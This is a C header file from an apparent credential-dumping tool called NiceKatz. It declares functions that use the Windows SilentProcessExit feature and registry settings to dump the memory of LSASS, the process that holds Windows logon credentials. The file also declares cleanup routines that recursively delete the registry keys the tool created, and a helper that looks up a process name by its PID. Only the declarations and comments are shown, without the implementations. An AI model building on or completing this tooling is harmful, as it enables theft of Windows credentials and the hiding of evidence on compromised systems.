#pragma once
#include "NiceKatz.h"

#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define FLG_DUMP_TYPE 0x2
#define FLG_REPORTING_MODE 0x2

typedef NTSTATUS(__stdcall* _RtlReportSilentProcessExit)
(
    HANDLE ProcessHandle,
    NTSTATUS ExitStatus
    );  _RtlReportSilentProcessExit RtlReportSilentProcessExit;

/*
* Manages the SilentProcessExit dump, this function will call further functions that will set up the required registry settings for SilentProcessExit
* With the required registry settings in place, the function will trigger the SilentProcessExit dump by using the native RtlSilentProcessExit API on the target process
* @param hTarget - An open handle of the target process to dump
* @param TargetId - The target PID of the process to dump
* @param pCmdArgs - A pointer to CommandLineArgs structure (defined in NiceKatz.h) which represents the supplied command line args
* @return BOOL - TRUE or FALSE
*/
BOOL SilentProcessExit(HANDLE hLsass, int LsassPid, pCommandLineArgs pCmdArgs);

/*
* Creates the required registry keys for SilentProcessExit to work
* @param IEFORegKey - A pointer to a wide character that represents the full path to the Image File Execution Options registry key
* @param SPERegKey - A pointer to a wide character that represents the full path to the Silent Process Exit registry key
* @return BOOL - TRUE or FALSE
*/
BOOL SetRegistry(WCHAR* IEFORegKey, WCHAR* SPERegKey);

/*
* Calls RegDelnodeRecurse to recursivly delete a registry key and all its subkeys, this function is part of the cleanup operations
* @param hKeyRoot - The root key (eg. HKLM)
* @param lpSubKey - The subkey to delete
* @return BOOL - TRUE or FALSE
* Credits - https://docs.microsoft.com/en-us/windows/win32/sysinfo/deleting-a-key-with-subkeys
*/
BOOL RegDelnode(HKEY hKeyRoot, LPWSTR lpSubKey);

/*
* Recursivly deletes the specified key and all of its suckeys
* @param hKeyRoot - The root key (eg. HKLM)
* @param lpSubKey - The subkey to delete
* @return BOOL - TRUE or FALSE
* Credits - https://docs.microsoft.com/en-us/windows/win32/sysinfo/deleting-a-key-with-subkeys
*/
BOOL RegDelnodeRecurse(HKEY hKeyRoot, LPWSTR lpSubKey);

/*
* Gets a process name by its PID
* @param TargetPid - The target PID which is name to be retrieved
* @param TargetProcessName - A pointer to a wide character which receives the name of the correspondent PID if found
* @return BOOL - TRUE or FALSE
*/
BOOL  GetProcessNameByPid(int TargetPid, WCHAR* TargetProcessName);

